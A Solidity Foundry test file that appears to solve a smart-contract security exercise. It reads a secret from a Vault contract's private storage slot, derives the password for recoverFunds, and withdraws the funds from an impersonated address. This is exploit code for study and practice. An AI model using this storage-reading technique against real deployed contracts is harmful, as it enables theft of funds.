// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;


import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault{value: 0.0001 ether}();
    }

    function testVault() public {

        bytes32 b_secret = vm.load(address(vault), 0);
        uint256 _secret = uint256(b_secret);
        uint256 _balance = 0.0002 ether;
        uint256 _password = uint256(keccak256(abi.encodePacked(_secret, _balance)));

        address me = makeAddr("ceseshi");
        deal(me, 0.0001 ether);
        vm.prank(me);
        vault.recoverFunds{value: 0.0001 ether}(_password);
    }
}
